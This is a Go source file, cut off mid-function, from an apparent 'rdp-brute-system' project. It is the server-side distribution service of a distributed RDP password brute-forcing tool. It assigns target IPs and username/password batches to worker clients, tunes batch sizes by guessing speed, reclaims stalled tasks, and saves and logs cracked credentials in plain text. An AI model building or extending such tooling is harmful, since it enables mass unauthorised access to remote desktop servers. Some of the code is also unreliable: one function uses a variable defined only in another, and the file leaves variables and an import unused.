package services

import (
	"fmt"
	"log"
	"math"
	"sync"
	"time"

	"github.com/google/uuid"
	"rdp-brute-system/server/database"
	"rdp-brute-system/server/models"
	"rdp-brute-system/shared/protocol"
)

const (
	// Base batch sizes - optimized for memory efficiency
	MinTargetBatchSize = 5
	MaxTargetBatchSize = 100
	DefaultBatchSize   = 20
	
	// Credentials batch sizes - significantly reduced for memory efficiency
	MinCredentialBatchSize = 10
	MaxCredentialBatchSize = 100
	DefaultUsernameBatch   = 50
	DefaultPasswordBatch   = 50
	
	// Performance thresholds
	HighPerformancePPS   = 1000.0
	MediumPerformancePPS = 500.0
	LowPerformancePPS    = 100.0
	
	// Task expiration
	DefaultTaskExpirationMinutes = 30
	MinTaskExpirationMinutes     = 5
	MaxTaskExpirationMinutes     = 120
	
	// Workload management
	MaxWorkloadTargets = 500  // Reduced from 1000 for better distribution
	
	// Memory optimization
	MaxCombinationsPerTask = 10000  // Max 10K combinations per task (e.g., 100x100)
)

type DistributionService struct {
	db            *database.DB
	taskService   *TaskService
	clientService *ClientService
	
	// Client performance tracking
	clientMetrics map[string]*ClientMetrics
	metricsMu     sync.RWMutex
	
	// Task recovery
	recoveryTicker *time.Ticker
	stopChan      chan bool
	
	// Credential pagination cache
	credentialCache *CredentialCache
	
	// Preemptive task assignment
	taskPredictor    *TaskPredictor
	pendingTasks     map[string]*PendingTask  // clientID -> pending task
	pendingTasksMu   sync.RWMutex
	
	// Work queue monitoring
	workQueueMonitor *WorkQueueMonitor
	
	// Operation control
	activeOperationID string
	operationPaused   bool
	operationMu       sync.RWMutex
}

type ClientMetrics struct {
	ClientID       string
	LastPPS        float64
	AvgPPS         float64
	SuccessRate    float64
	LastBatchSize  int
	LastUpdate     time.Time
	ActiveTasks    int
	TotalProcessed int64
	ResponseTime   time.Duration
	
	// Enhanced metrics for prediction
	CompletionRate   float64       // Tasks completed per minute
	AvgTaskDuration  time.Duration
	LastTaskComplete time.Time
	QueueEmptyCount  int           // Number of times client had empty queue
}

// PendingTask represents a pre-allocated task waiting to be assigned
type PendingTask struct {
	Task         *protocol.Task
	AllocatedAt  time.Time
	PredictedFor time.Time  // When we predict client will need it
}

// TaskPredictor predicts when clients will need new tasks
type TaskPredictor struct {
	service *DistributionService
	mu      sync.RWMutex
}

// WorkQueueMonitor monitors global work queue health
type WorkQueueMonitor struct {
	service        *DistributionService
	totalWork      int64
	completedWork  int64
	mu             sync.RWMutex
	lastUpdate     time.Time
	workRate       float64  // Work items completed per second
}

// CredentialCache manages credential pagination to reduce memory usage
type CredentialCache struct {
	usernames      []string
	passwords      []string
	usernameOffset int
	passwordOffset int
	mu             sync.RWMutex
}

func NewDistributionService(taskService *TaskService, clientService *ClientService) *DistributionService {
	ds := &DistributionService{
		db:            taskService.db,
		taskService:   taskService,
		clientService: clientService,
		clientMetrics: make(map[string]*ClientMetrics),
		stopChan:      make(chan bool),
		credentialCache: &CredentialCache{
			usernames: make([]string, 0),
			passwords: make([]string, 0),
		},
		pendingTasks: make(map[string]*PendingTask),
	}
	
	ds.taskPredictor = &TaskPredictor{service: ds}
	ds.workQueueMonitor = &WorkQueueMonitor{service: ds}
	
	return ds
}

// GetTask creates and assigns a new task for a client with intelligent distribution
func (s *DistributionService) GetTask(clientID string) (*protocol.Task, error) {
	// Check if operations are paused
	s.operationMu.RLock()
	if s.operationPaused {
		s.operationMu.RUnlock()
		return nil, nil // Return nil to indicate no work available
	}
	operationID := s.activeOperationID
	s.operationMu.RUnlock()
	
	// Check if we have a pre-allocated task for this client
	s.pendingTasksMu.RLock()
	pendingTask, hasPending := s.pendingTasks[clientID]
	s.pendingTasksMu.RUnlock()
	
	if hasPending && time.Since(pendingTask.AllocatedAt) < 5*time.Minute {
		// Use the pre-allocated task
		s.pendingTasksMu.Lock()
		delete(s.pendingTasks, clientID)
		s.pendingTasksMu.Unlock()
		
		log.Printf("Using pre-allocated task %s for client %s (predicted for %v)",
			pendingTask.Task.ID, clientID, pendingTask.PredictedFor)
		
		// Pre-allocate the next task
		go s.preAllocateNextTask(clientID)
		
		return pendingTask.Task, nil
	}
	
	// Create new task as before
	task, err := s.createNewTask(clientID)
	if err != nil {
		return nil, err
	}
	
	// Pre-allocate the next task for this client
	go s.preAllocateNextTask(clientID)
	
	return task, nil
}

// createNewTask creates a new task (extracted from original GetTask)
func (s *DistributionService) createNewTask(clientID string) (*protocol.Task, error) {
	// Calculate optimal batch sizes for this client
	targetBatchSize, credentialBatchSize := s.calculateOptimalBatchSizes(clientID)
	
	// Check client's current workload
	currentWorkload, err := s.db.GetClientWorkload(clientID)
	if err != nil {
		log.Printf("Error getting client workload: %v", err)
		return nil, err
	}
	
	// Prevent overloading clients
	if currentWorkload >= MaxWorkloadTargets {
		log.Printf("Client %s has reached maximum workload (%d targets)", clientID, currentWorkload)
		return nil, nil
	}
	
	// Adjust batch size based on remaining capacity
	remainingCapacity := MaxWorkloadTargets - currentWorkload
	if targetBatchSize > remainingCapacity {
		targetBatchSize = remainingCapacity
	}

	// Get prioritized targets
	targets, err := s.db.GetTargetsWithPriority(targetBatchSize)
	if err != nil {
		log.Printf("Error getting targets: %v", err)
		return nil, err
	}
	if len(targets) == 0 {
		log.Println("No pending targets available.")
		return nil, nil
	}

	// Get credentials with dynamic batching
	usernames, passwords, err := s.getOptimizedCredentials(credentialBatchSize)
	if err != nil {
		log.Printf("Error getting credentials: %v", err)
		return nil, err
	}

	taskID := uuid.New().String()

	// Convert targets to IP strings
	var ips []string
	for _, target := range targets {
		ips = append(ips, target.IP)
	}

	// Determine task priority based on client performance
	priority := s.calculateTaskPriority(clientID)

	protoTask := &protocol.Task{
		ID:        taskID,
		IPs:       ips,
		Usernames: usernames,
		Passwords: passwords,
		Priority:  priority,
	}

	// Create task with expiration
	task := &models.Task{
		ID:          taskID,
		ClientID:    clientID,
		Status:      "assigned",
		Priority:    priority,
		TargetCount: len(targets),
		AssignedAt:  time.Now(),
		OperationID: operationID, // Link to active operation
	}
	
	// Calculate expiration based on batch size and client performance
	expirationMinutes := s.calculateTaskExpiration(clientID, len(targets), len(usernames)*len(passwords))
	
	if err := s.db.CreateTask(task, targets, expirationMinutes); err != nil {
		log.Printf("Error creating task: %v", err)
		return nil, err
	}

	// Update client metrics
	s.updateClientMetrics(clientID, len(targets))

	totalCombinations := len(targets) * len(usernames) * len(passwords)
	
	// Calculate dynamic expiration
	dynamicExpiration := s.calculateDynamicExpiration(clientID, task)
	actualExpirationMinutes := int(time.Until(dynamicExpiration).Minutes())
	
	log.Printf("Assigned task %s to client %s: %d targets, %d usernames, %d passwords = %d combinations (priority: %d, dynamic expiration: %s)",
		taskID, clientID, len(targets), len(usernames), len(passwords), totalCombinations, priority, dynamicExpiration.Format("15:04:05"))
	return protoTask, nil
}

// preAllocateNextTask pre-allocates a task for a client based on prediction
func (s *DistributionService) preAllocateNextTask(clientID string) {
	// Predict when client will need next task
	predictedTime := s.taskPredictor.PredictNextTaskTime(clientID)
	if predictedTime.IsZero() {
		return
	}
	
	// If prediction is too far in the future, don't pre-allocate
	timeUntilNeeded := time.Until(predictedTime)
	if timeUntilNeeded > 30*time.Second {
		// Schedule pre-allocation for later
		time.AfterFunc(timeUntilNeeded-10*time.Second, func() {
			s.preAllocateNextTask(clientID)
		})
		return
	}
	
	// Create task now
	task, err := s.createNewTask(clientID)
	if err != nil {
		log.Printf("Failed to pre-allocate task for client %s: %v", clientID, err)
		return
	}
	
	// Store as pending task
	s.pendingTasksMu.Lock()
	s.pendingTasks[clientID] = &PendingTask{
		Task:         task,
		AllocatedAt:  time.Now(),
		PredictedFor: predictedTime,
	}
	s.pendingTasksMu.Unlock()
	
	log.Printf("Pre-allocated task %s for client %s (predicted need at %v)",
		task.ID, clientID, predictedTime)
}

// PredictNextTaskTime predicts when a client will complete current task
func (tp *TaskPredictor) PredictNextTaskTime(clientID string) time.Time {
	tp.mu.RLock()
	defer tp.mu.RUnlock()
	
	tp.service.metricsMu.RLock()
	metrics, exists := tp.service.clientMetrics[clientID]
	tp.service.metricsMu.RUnlock()
	
	if !exists || metrics.AvgPPS == 0 || metrics.ActiveTasks == 0 {
		return time.Time{} // Can't predict
	}
	
	// Get current workload
	currentWorkload, err := tp.service.db.GetClientWorkload(clientID)
	if err != nil || currentWorkload == 0 {
		return time.Time{}
	}
	
	// Estimate combinations per target based on last batch
	avgCombinationsPerTarget := float64(metrics.LastBatchSize * 50 * 50) // Approximate
	totalCombinations := float64(currentWorkload) * avgCombinationsPerTarget
	
	// Calculate estimated completion time
	secondsToComplete := totalCombinations / metrics.AvgPPS
	
	// Add buffer for variance and network latency
	buffer := secondsToComplete * 0.1 // 10% buffer
	if metrics.ResponseTime > 0 {
		buffer += metrics.ResponseTime.Seconds()
	}
	
	predictedTime := time.Now().Add(time.Duration(secondsToComplete+buffer) * time.Second)
	
	// Adjust based on queue empty history
	if metrics.QueueEmptyCount > 5 {
		// Client frequently runs out of work, predict earlier
		predictedTime = predictedTime.Add(-5 * time.Second)
	}
	
	return predictedTime
}

// UpdateWorkQueue updates the global work queue metrics
func (wqm *WorkQueueMonitor) UpdateWorkQueue(totalTargets int64, completedTargets int64) {
	wqm.mu.Lock()
	defer wqm.mu.Unlock()
	
	now := time.Now()
	if wqm.lastUpdate.IsZero() {
		wqm.lastUpdate = now
	}
	
	timeDiff := now.Sub(wqm.lastUpdate).Seconds()
	if timeDiff > 0 {
		workDone := completedTargets - wqm.completedWork
		wqm.workRate = float64(workDone) / timeDiff
	}
	
	wqm.totalWork = totalTargets
	wqm.completedWork = completedTargets
	wqm.lastUpdate = now
}

// GetWorkRate returns the current work completion rate
func (wqm *WorkQueueMonitor) GetWorkRate() float64 {
	wqm.mu.RLock()
	defer wqm.mu.RUnlock()
	return wqm.workRate
}

// GetRemainingWork returns the amount of work remaining
func (wqm *WorkQueueMonitor) GetRemainingWork() int64 {
	wqm.mu.RLock()
	defer wqm.mu.RUnlock()
	return wqm.totalWork - wqm.completedWork
}

// calculateOptimalBatchSizes determines the best batch sizes for targets and credentials with load balancing
func (s *DistributionService) calculateOptimalBatchSizes(clientID string) (targetBatch, credentialBatch int) {
	s.metricsMu.RLock()
	metrics, exists := s.clientMetrics[clientID]
	s.metricsMu.RUnlock()

	// Default sizes for new clients
	targetBatch = DefaultBatchSize
	credentialBatch = DefaultUsernameBatch

	if !exists || metrics.AvgPPS == 0 {
		return targetBatch, credentialBatch
	}

	// Get performance data from database
	avgPPS, successRate, err := s.db.GetClientPerformance(clientID)
	if err != nil {
		log.Printf("Error getting client performance: %v", err)
		return targetBatch, credentialBatch
	}

	// Use database metrics if available
	if avgPPS > 0 {
		metrics.AvgPPS = avgPPS
		metrics.SuccessRate = successRate
	}

	// Get global load metrics for balancing
	loadScore := s.calculateGlobalLoadScore()
	clientLoadFactor := s.calculateClientLoadFactor(clientID)

	// Calculate optimal target batch size based on performance and load
	if metrics.AvgPPS >= HighPerformancePPS {
		targetBatch = int(math.Min(float64(MaxTargetBatchSize), metrics.AvgPPS*0.02*clientLoadFactor))
		credentialBatch = int(math.Min(float64(MaxCredentialBatchSize), math.Sqrt(metrics.AvgPPS)*2*clientLoadFactor))
	} else if metrics.AvgPPS >= MediumPerformancePPS {
		targetBatch = int(math.Min(float64(MaxTargetBatchSize/2), metrics.AvgPPS*0.03*clientLoadFactor))
		credentialBatch = int(math.Min(float64(MaxCredentialBatchSize/2), math.Sqrt(metrics.AvgPPS)*1.5*clientLoadFactor))
	} else if metrics.AvgPPS >= LowPerformancePPS {
		targetBatch = int(math.Min(float64(MaxTargetBatchSize/4), metrics.AvgPPS*0.05*clientLoadFactor))
		credentialBatch = int(math.Min(float64(MaxCredentialBatchSize/4), math.Sqrt(metrics.AvgPPS)*clientLoadFactor))
	} else {
		targetBatch = MinTargetBatchSize
		credentialBatch = MinCredentialBatchSize
	}

	// Adjust based on success rate
	if metrics.SuccessRate < 0.1 {
		targetBatch = int(float64(targetBatch) * 0.8)
		credentialBatch = int(float64(credentialBatch) * 0.8)
	} else if metrics.SuccessRate > 0.5 {
		targetBatch = int(float64(targetBatch) * 1.1)
		credentialBatch = int(float64(credentialBatch) * 1.1)
	}

	// Load balancing adjustments
	if loadScore > 0.8 { // System is heavily loaded
		targetBatch = int(float64(targetBatch) * 0.7)
		credentialBatch = int(float64(credentialBatch) * 0.7)
	} else if loadScore < 0.3 { // System has capacity
		targetBatch = int(float64(targetBatch) * 1.3)
		credentialBatch = int(float64(credentialBatch) * 1.3)
	}

	// Ensure we don't exceed memory limits
	totalCombinations := targetBatch * credentialBatch * credentialBatch
	if totalCombinations > MaxCombinationsPerTask {
		// Adjust to stay within limits
		factor := math.Sqrt(float64(MaxCombinationsPerTask) / float64(totalCombinations))
		targetBatch = int(float64(targetBatch) * factor)
		credentialBatch = int(float64(credentialBatch) * factor)
	}

	// Apply bounds
	if targetBatch < MinTargetBatchSize {
		targetBatch = MinTargetBatchSize
	} else if targetBatch > MaxTargetBatchSize {
		targetBatch = MaxTargetBatchSize
	}

	if credentialBatch < MinCredentialBatchSize {
		credentialBatch = MinCredentialBatchSize
	} else if credentialBatch > MaxCredentialBatchSize {
		credentialBatch = MaxCredentialBatchSize
	}

	return targetBatch, credentialBatch
}

// calculateGlobalLoadScore calculates the overall system load (0-1)
func (s *DistributionService) calculateGlobalLoadScore() float64 {
	s.metricsMu.RLock()
	defer s.metricsMu.RUnlock()

	if len(s.clientMetrics) == 0 {
		return 0
	}

	var totalLoad float64
	var activeClients int

	for _, metrics := range s.clientMetrics {
		if metrics.ActiveTasks > 0 {
			activeClients++
			// Calculate individual client load
			if metrics.AvgPPS > 0 {
				workload := float64(metrics.ActiveTasks) * float64(metrics.LastBatchSize) * 50 * 50 // Approximate combinations
				timeToComplete := workload / metrics.AvgPPS
				
				// Load score based on time to complete (normalized to 0-1)
				clientLoad := math.Min(timeToComplete/3600, 1.0) // Normalize to 1 hour
				totalLoad += clientLoad
			}
		}
	}

	if activeClients == 0 {
		return 0
	}

	return totalLoad / float64(len(s.clientMetrics))
}

// calculateClientLoadFactor calculates load factor for a specific client
func (s *DistributionService) calculateClientLoadFactor(clientID string) float64 {
	s.metricsMu.RLock()
	defer s.metricsMu.RUnlock()

	metrics, exists := s.clientMetrics[clientID]
	if !exists {
		return 1.0 // Default factor
	}

	// Calculate relative performance compared to other clients
	var avgSystemPPS float64
	var clientCount int

	for _, m := range s.clientMetrics {
		if m.AvgPPS > 0 {
			avgSystemPPS += m.AvgPPS
			clientCount++
		}
	}

	if clientCount == 0 || avgSystemPPS == 0 {
		return 1.0
	}

	avgSystemPPS /= float64(clientCount)

	// Calculate relative performance
	relativePerfomance := metrics.AvgPPS / avgSystemPPS

	// Clients performing better than average get more work
	if relativePerfomance > 1.5 {
		return 1.3 // 30% more work
	} else if relativePerfomance > 1.0 {
		return 1.1 // 10% more work
	} else if relativePerfomance < 0.5 {
		return 0.7 // 30% less work
	} else if relativePerfomance < 0.8 {
		return 0.9 // 10% less work
	}

	return 1.0
}

// RebalanceWork redistributes work when new clients join or performance changes
func (s *DistributionService) RebalanceWork() {
	log.Println("Starting work rebalancing...")

	s.metricsMu.RLock()
	clientCount := len(s.clientMetrics)
	s.metricsMu.RUnlock()

	if clientCount < 2 {
		return // Need at least 2 clients to rebalance
	}

	// Calculate work distribution variance
	variance := s.calculateWorkVariance()
	
	if variance < 0.2 {
		// Work is reasonably balanced
		return
	}

	// Find overloaded and underloaded clients
	overloaded, underloaded := s.identifyLoadImbalance()

	if len(overloaded) == 0 || len(underloaded) == 0 {
		return
	}

	// Redistribute work
	redistributed := 0
	for _, overClient := range overloaded {
		for _, underClient := range underloaded {
			if redistributed >= 10 { // Limit redistribution per cycle
				break
			}

			// Check if redistribution would help
			if s.shouldRedistribute(overClient, underClient) {
				if err := s.redistributeWork(overClient, underClient); err != nil {
					log.Printf("Error redistributing work: %v", err)
				} else {
					redistributed++
				}
			}
		}
	}

	if redistributed > 0 {
		log.Printf("Rebalanced %d work units", redistributed)
	}
}

// calculateWorkVariance calculates the variance in work distribution
func (s *DistributionService) calculateWorkVariance() float64 {
	s.metricsMu.RLock()
	defer s.metricsMu.RUnlock()

	if len(s.clientMetrics) < 2 {
		return 0
	}

	var workloads []float64
	var total float64

	for _, metrics := range s.clientMetrics {
		workload := float64(metrics.ActiveTasks * metrics.LastBatchSize)
		workloads = append(workloads, workload)
		total += workload
	}

	mean := total / float64(len(workloads))
	
	var variance float64
	for _, workload := range workloads {
		variance += math.Pow(workload-mean, 2)
	}
	
	variance /= float64(len(workloads))
	
	// Normalize variance (0-1)
	if mean > 0 {
		return math.Min(variance/(mean*mean), 1.0)
	}
	
	return 0
}

// identifyLoadImbalance identifies overloaded and underloaded clients
func (s *DistributionService) identifyLoadImbalance() (overloaded, underloaded []string) {
	s.metricsMu.RLock()
	defer s.metricsMu.RUnlock()

	// Calculate average workload
	var totalWork float64
	var clientCount int

	workloads := make(map[string]float64)

	for clientID, metrics := range s.clientMetrics {
		if metrics.AvgPPS > 0 {
			// Calculate effective workload (time to complete)
			combinations := float64(metrics.ActiveTasks * metrics.LastBatchSize * 50 * 50)
			timeToComplete := combinations / metrics.AvgPPS
			workloads[clientID] = timeToComplete
			totalWork += timeToComplete
			clientCount++
		}
	}

	if clientCount == 0 {
		return
	}

	avgWork := totalWork / float64(clientCount)

	// Identify imbalanced clients
	for clientID, workload := range workloads {
		if workload > avgWork*1.5 {
			overloaded = append(overloaded, clientID)
		} else if workload < avgWork*0.5 {
			underloaded = append(underloaded, clientID)
		}
	}

	return
}

// shouldRedistribute checks if work should be redistributed between two clients
func (s *DistributionService) shouldRedistribute(fromClient, toClient string) bool {
	s.metricsMu.RLock()
	defer s.metricsMu.RUnlock()

	fromMetrics, fromExists := s.clientMetrics[fromClient]
	toMetrics, toExists := s.clientMetrics[toClient]

	if !fromExists || !toExists {
		return false
	}

	// Don't redistribute if target client is struggling
	if toMetrics.SuccessRate < 0.3 || toMetrics.QueueEmptyCount > 5 {
		return false
	}

	// Check if redistribution would actually help
	fromWorkTime := float64(fromMetrics.ActiveTasks*fromMetrics.LastBatchSize*50*50) / fromMetrics.AvgPPS
	toWorkTime := float64(toMetrics.ActiveTasks*toMetrics.LastBatchSize*50*50) / toMetrics.AvgPPS

	// Only redistribute if it would significantly improve balance
	return fromWorkTime > toWorkTime*2
}

// redistributeWork moves work from one client to another
func (s *DistributionService) redistributeWork(fromClient, toClient string) error {
	// This would interact with the WorkPoolService to move tasks
	// For now, we'll mark it as a future task redistribution
	
	log.Printf("Redistributing work from client %s to client %s", fromClient, toClient)
	
	// Signal the work pool service about redistribution need
	// This would be implemented with actual task movement logic
	
	return nil
}

// MonitorNewClient handles load balancing when a new client joins
func (s *DistributionService) MonitorNewClient(clientID string) {
	// Wait for client to establish baseline performance
	time.AfterFunc(30*time.Second, func() {
		s.metricsMu.RLock()
		metrics, exists := s.clientMetrics[clientID]
		s.metricsMu.RUnlock()

		if !exists || metrics.AvgPPS == 0 {
			return
		}

		// Check if rebalancing would help
		variance := s.calculateWorkVariance()
		if variance > 0.3 {
			log.Printf("New client %s triggered rebalancing (variance: %.2f)", clientID, variance)
			s.RebalanceWork()
		}
	})
}

// getOptimizedCredentials retrieves credentials with pagination to reduce memory usage
func (s *DistributionService) getOptimizedCredentials(batchSize int) ([]string, []string, error) {
	s.credentialCache.mu.Lock()
	defer s.credentialCache.mu.Unlock()

	// Refresh cache if empty
	if len(s.credentialCache.usernames) == 0 {
		usernames, err := s.db.GetUsernames(1000) // Load larger batch into cache
		if err != nil {
			return nil, nil, err
		}
		s.credentialCache.usernames = usernames
		s.credentialCache.usernameOffset = 0
	}

	if len(s.credentialCache.passwords) == 0 {
		passwords, err := s.db.GetPasswords(1000) // Load larger batch into cache
		if err != nil {
			return nil, nil, err
		}
		s.credentialCache.passwords = passwords
		s.credentialCache.passwordOffset = 0
	}

	// Get paginated subset
	usernameEnd := s.credentialCache.usernameOffset + batchSize
	if usernameEnd > len(s.credentialCache.usernames) {
		usernameEnd = len(s.credentialCache.usernames)
	}
	usernames := s.credentialCache.usernames[s.credentialCache.usernameOffset:usernameEnd]

	passwordEnd := s.credentialCache.passwordOffset + batchSize
	if passwordEnd > len(s.credentialCache.passwords) {
		passwordEnd = len(s.credentialCache.passwords)
	}
	passwords := s.credentialCache.passwords[s.credentialCache.passwordOffset:passwordEnd]

	// Update offsets for round-robin distribution
	s.credentialCache.usernameOffset = usernameEnd % len(s.credentialCache.usernames)
	s.credentialCache.passwordOffset = passwordEnd % len(s.credentialCache.passwords)

	return usernames, passwords, nil
}

// calculateTaskPriority determines task priority based on client performance
func (s *DistributionService) calculateTaskPriority(clientID string) int {
	s.metricsMu.RLock()
	metrics, exists := s.clientMetrics[clientID]
	s.metricsMu.RUnlock()

	if !exists || metrics.AvgPPS == 0 {
		return 2 // Medium priority for new clients
	}

	// High-performance clients with good success rates get higher priority
	if metrics.AvgPPS >= HighPerformancePPS && metrics.SuccessRate > 0.3 {
		return 3
	} else if metrics.AvgPPS >= MediumPerformancePPS {
		return 2
	}
	
	return 1
}

// calculateTaskExpiration determines expiration time based on client, task size, and combinations
func (s *DistributionService) calculateTaskExpiration(clientID string, targetCount, combinationCount int) int {
	s.metricsMu.RLock()
	metrics, exists := s.clientMetrics[clientID]
	s.metricsMu.RUnlock()

	baseExpiration := DefaultTaskExpirationMinutes

	if exists && metrics.AvgPPS > 0 {
		// Estimate time needed based on PPS and actual combinations
		estimatedSeconds := float64(targetCount*combinationCount) / metrics.AvgPPS
		estimatedMinutes := int(estimatedSeconds/60) * 2 // 2x buffer for network latency

		if estimatedMinutes > baseExpiration {
			baseExpiration = estimatedMinutes
		}

		// Adjust based on response time
		if metrics.ResponseTime > 0 {
			latencyBuffer := int(metrics.ResponseTime.Minutes() * float64(targetCount))
			baseExpiration += latencyBuffer
		}
	}

	// Apply bounds
	if baseExpiration < MinTaskExpirationMinutes {
		baseExpiration = MinTaskExpirationMinutes
	} else if baseExpiration > MaxTaskExpirationMinutes {
		baseExpiration = MaxTaskExpirationMinutes
	}

	return baseExpiration
}

// updateClientMetrics updates performance tracking for a client
func (s *DistributionService) updateClientMetrics(clientID string, batchSize int) {
	s.metricsMu.Lock()
	defer s.metricsMu.Unlock()

	if _, exists := s.clientMetrics[clientID]; !exists {
		s.clientMetrics[clientID] = &ClientMetrics{
			ClientID: clientID,
		}
	}

	metrics := s.clientMetrics[clientID]
	metrics.LastBatchSize = batchSize
	metrics.LastUpdate = time.Now()
	metrics.ActiveTasks++
	
	// Track if client has been idle
	if metrics.ActiveTasks == 1 && !metrics.LastTaskComplete.IsZero() {
		idleTime := time.Since(metrics.LastTaskComplete)
		if idleTime > 10*time.Second {
			metrics.QueueEmptyCount++
			log.Printf("Client %s was idle for %v (count: %d)", clientID, idleTime, metrics.QueueEmptyCount)
		}
	}
}

// UpdateClientPerformance updates client metrics based on heartbeat data
func (s *DistributionService) UpdateClientPerformance(clientID string, pps float64, attempts int64, successes int) {
	s.metricsMu.Lock()
	defer s.metricsMu.Unlock()

	if _, exists := s.clientMetrics[clientID]; !exists {
		s.clientMetrics[clientID] = &ClientMetrics{
			ClientID: clientID,
		}
	}

	metrics := s.clientMetrics[clientID]
	metrics.LastPPS = pps
	
	// Update moving average PPS with more weight on recent performance
	if metrics.AvgPPS == 0 {
		metrics.AvgPPS = pps
	} else {
		// Adaptive weight based on consistency
		weight := 0.3
		if math.Abs(pps-metrics.AvgPPS)/metrics.AvgPPS < 0.2 { // Less than 20% variance
			weight = 0.5 // More weight for consistent performance
		}
		metrics.AvgPPS = metrics.AvgPPS*(1-weight) + pps*weight
	}
	
	// Calculate success rate
	if attempts > 0 {
		metrics.SuccessRate = float64(successes) / float64(attempts)
	}
	
	metrics.TotalProcessed += attempts
	metrics.LastUpdate = time.Now()
}

// SaveResult saves a successful result from a client
func (s *DistributionService) SaveResult(clientID string, result *protocol.Result) error {
	dbResult := &models.Result{
		ClientID: clientID,
		IP:       result.IP,
		Port:     result.Port,
		Username: result.Username,
		Password: result.Password,
		FoundAt:  time.Now(),
		Verified: true,
	}

	if err := s.db.SaveResult(dbResult); err != nil {
		log.Printf("Error saving result for %s: %v", result.IP, err)
		return err
	}

	log.Printf("Successfully saved result for %s:%d - %s:%s", result.IP, result.Port, result.Username, result.Password)
	return nil
}

// Start begins task distribution and recovery monitoring
func (s *DistributionService) Start() {
	log.Println("Task distribution service started with preemptive task assignment and load balancing")
	
	// Start task recovery routine with faster interval
	s.recoveryTicker = time.NewTicker(2 * time.Minute) // Reduced from 5 minutes
	go s.taskRecoveryRoutine()
	
	// Start credential cache refresh routine
	go s.credentialCacheRefresh()
	
	// Start work queue monitoring
	go s.workQueueMonitorRoutine()
	
	// Start pending task cleanup
	go s.pendingTaskCleanup()
	
	// Start load balancing routine
	go s.loadBalancingRoutine()
}

// loadBalancingRoutine periodically checks and rebalances work
func (s *DistributionService) loadBalancingRoutine() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			s.RebalanceWork()
		case <-s.stopChan:
			return
		}
	}
}

// workQueueMonitorRoutine monitors global work queue health
func (s *DistributionService) workQueueMonitorRoutine() {
	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			// Get current work statistics
			stats, err := s.db.GetWorkQueueStats()
			if err == nil {
				s.workQueueMonitor.UpdateWorkQueue(stats.TotalTargets, stats.CompletedTargets)
				
				// Log if work queue is getting low
				remaining := s.workQueueMonitor.GetRemainingWork()
				if remaining < 1000 && remaining > 0 {
					log.Printf("Warning: Work queue running low (%d targets remaining)", remaining)
				}
			}
		case <-s.stopChan:
			return
		}
	}
}

// pendingTaskCleanup removes stale pending tasks
func (s *DistributionService) pendingTaskCleanup() {
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			s.pendingTasksMu.Lock()
			for clientID, pending := range s.pendingTasks {
				if time.Since(pending.AllocatedAt) > 5*time.Minute {
					// Task is too old, remove it
					delete(s.pendingTasks, clientID)
					log.Printf("Removed stale pending task for client %s", clientID)
					
					// Reclaim the task's targets
					if err := s.db.ReclaimTask(pending.Task.ID); err != nil {
						log.Printf("Error reclaiming pending task %s: %v", pending.Task.ID, err)
					}
				}
			}
			s.pendingTasksMu.Unlock()
		case <-s.stopChan:
			return
		}
	}
}

// Stop ends task distribution and recovery monitoring
func (s *DistributionService) Stop() {
	log.Println("Stopping task distribution service")
	
	if s.recoveryTicker != nil {
		s.recoveryTicker.Stop()
	}
	
	close(s.stopChan)
}

// credentialCacheRefresh periodically refreshes the credential cache
func (s *DistributionService) credentialCacheRefresh() {
	ticker := time.NewTicker(30 * time.Minute)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			s.credentialCache.mu.Lock()
			// Clear cache to force refresh
			s.credentialCache.usernames = s.credentialCache.usernames[:0]
			s.credentialCache.passwords = s.credentialCache.passwords[:0]
			s.credentialCache.usernameOffset = 0
			s.credentialCache.passwordOffset = 0
			s.credentialCache.mu.Unlock()
			log.Println("Credential cache cleared for refresh")
		case <-s.stopChan:
			return
		}
	}
}

// taskRecoveryRoutine periodically checks for expired tasks and reclaims them
func (s *DistributionService) taskRecoveryRoutine() {
	for {
		select {
		case <-s.recoveryTicker.C:
			s.recoverExpiredTasks()
		case <-s.stopChan:
			return
		}
	}
}

// recoverExpiredTasks finds and reclaims expired tasks with smart detection
func (s *DistributionService) recoverExpiredTasks() {
	log.Println("Checking for expired and struggling tasks...")
	
	// Get expired tasks
	expiredTasks, err := s.db.GetExpiredTasks()
	if err != nil {
		log.Printf("Error getting expired tasks: %v", err)
		return
	}
	
	// Also check for struggling tasks (not expired but making poor progress)
	strugglingTasks := s.detectStrugglingTasks()
	
	// Combine both lists
	allTasksToRecover := append(expiredTasks, strugglingTasks...)
	
	for _, task := range allTasksToRecover {
		// Check if partial recovery is possible
		if task.Progress > 10 && task.Progress < 90 {
			// Task has made some progress, do partial recovery
			log.Printf("Partial recovery of task %s (%.1f%% complete) from client %s",
				task.ID, task.Progress, task.ClientID)
			
			if err := s.partialTaskRecovery(task); err != nil {
				log.Printf("Error in partial recovery of task %s: %v", task.ID, err)
				// Fall back to full recovery
				if err := s.db.ReclaimTask(task.ID); err != nil {
					log.Printf("Error reclaiming task %s: %v", task.ID, err)
					continue
				}
			}
		} else {
			// Full recovery
			log.Printf("Full recovery of task %s from client %s", task.ID, task.ClientID)
			
			if err := s.db.ReclaimTask(task.ID); err != nil {
				log.Printf("Error reclaiming task %s: %v", task.ID, err)
				continue
			}
		}
		
		// Update client metrics
		s.metricsMu.Lock()
		if metrics, exists := s.clientMetrics[task.ClientID]; exists {
			metrics.ActiveTasks--
			if metrics.ActiveTasks < 0 {
				metrics.ActiveTasks = 0
			}
			
			// Penalize based on task progress
			if task.Progress < 20 {
				// Severe penalty for making little progress
				metrics.AvgPPS *= 0.7
			} else {
				// Moderate penalty
				metrics.AvgPPS *= 0.9
			}
			
			// Mark client as potentially struggling
			metrics.QueueEmptyCount++ // Reuse this field as struggle indicator
		}
		s.metricsMu.Unlock()
	}
	
	if len(allTasksToRecover) > 0 {
		log.Printf("Recovered %d tasks (%d expired, %d struggling)",
			len(allTasksToRecover), len(expiredTasks), len(strugglingTasks))
	}
}

// detectStrugglingTasks identifies tasks that are making poor progress
func (s *DistributionService) detectStrugglingTasks() []models.Task {
	var strugglingTasks []models.Task
	
	// Get all active tasks
	activeTasks, err := s.db.GetActiveTasks()
	if err != nil {
		log.Printf("Error getting active tasks: %v", err)
		return strugglingTasks
	}
	
	now := time.Now()
	
	for _, task := range activeTasks {
